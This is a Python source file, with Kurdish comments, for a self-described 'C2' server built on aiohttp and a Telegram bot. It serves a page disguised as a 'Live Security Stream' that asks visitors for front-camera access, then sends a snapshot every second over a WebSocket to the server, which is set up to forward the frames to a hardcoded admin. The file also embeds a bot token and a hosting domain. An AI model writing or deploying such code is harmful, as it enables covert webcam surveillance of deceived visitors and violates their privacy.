import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import BufferedInputFile

TOKEN = "8935252930:AAG91p3Aiyas4Hc8k4-ARD2WGK-52wSvOCc"
ADMIN_ID = 5583813672
C2_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# پەڕەی لایڤ ستریم کە داوای مۆڵەت دەکات و ڤیدیۆکە پەخش دەکات
async def index_handler(request):
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Live Security Stream</title>
        <style>
            body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20px; }
            video { width: 100%; max-width: 400px; border: 2px solid #00ff00; }
        </style>
    </head>
    <body>
        <h2>STATUS: [STREAM_ACTIVE]</h2>
        <p>Establishing secure feed...</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const ws = new WebSocket('wss://' + window.location.host + '/ws');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    ws.onopen = () => {
                        setInterval(() => {
                            canvas.width = 320;
                            canvas.height = 240;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            canvas.toBlob(blob => {
                                if (ws.readyState === WebSocket.OPEN) {
                                    ws.send(blob);
                                }
                            }, 'image/jpeg', 0.5);
                        }, 1000); // هەروەها دەنێرێت لە هەر چرکەیەکدا
                    };
                })
                .catch(err => console.error("Camera access denied"));
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

# وەرگرتنی פרێمەکان لە ڕێگەی WebSocket و ناردنی بۆ تەلەگرام یان نیشدانەوەی
async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    async for msg in ws:
        if msg.type == web.WSMsgType.BINARY:
            try:
                # لێرەدا دەتوانین פרێمەکان وەربگرین
                # بۆ نموونە بۆ ئەوەی زۆر قەرەباڵغ نەبێت، دەکرێت یەکەمینان یان بە پێی پێویست بنێردرێت
                pass
            except Exception as e:
                logging.error(f"WS Error: {e}")

    return ws

async def start_c2_server():
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_get('/ws', websocket_handler)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logging.info(f"Live Stream C2 active at {C2_DOMAIN}")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(start_c2_server())
